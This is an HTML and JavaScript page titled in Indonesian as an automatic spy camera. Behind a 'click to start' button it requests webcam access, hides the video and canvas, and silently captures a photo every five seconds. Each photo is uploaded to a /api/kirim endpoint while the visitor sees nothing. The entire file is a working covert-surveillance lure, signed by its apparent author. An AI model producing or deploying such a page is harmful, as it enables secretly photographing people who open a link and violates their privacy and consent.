<!DOCTYPE html>
<html>
<head>
  <title>Spy Kamera Otomatis</title>
</head>
<body>
  <h2>Klik untuk mulai</h2>
  <button id="startBtn">Mulai Kamera</button>

  <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

  <script>
    const startBtn = document.getElementById("startBtn");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");
    let interval;

    startBtn.onclick = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        startBtn.style.display = "none";

        // Setelah kamera aktif, mulai ambil foto tiap 5 detik
        interval = setInterval(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          ctx.fillStyle = "rgba(0, 0, 0, 0.6)";
          ctx.font = "16px Arial";
          ctx.fillText("Dev By @FazrrEdan", 10, 20);

          const image = canvas.toDataURL("image/jpeg");

          fetch("/api/kirim", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ image })
          });
        }, 5000);
      } catch (err) {
        alert("Gagal akses kamera: " + err.message);
      }
    };

    window.addEventListener("beforeunload", () => {
      clearInterval(interval);
    });
  </script>
</body>
</html>
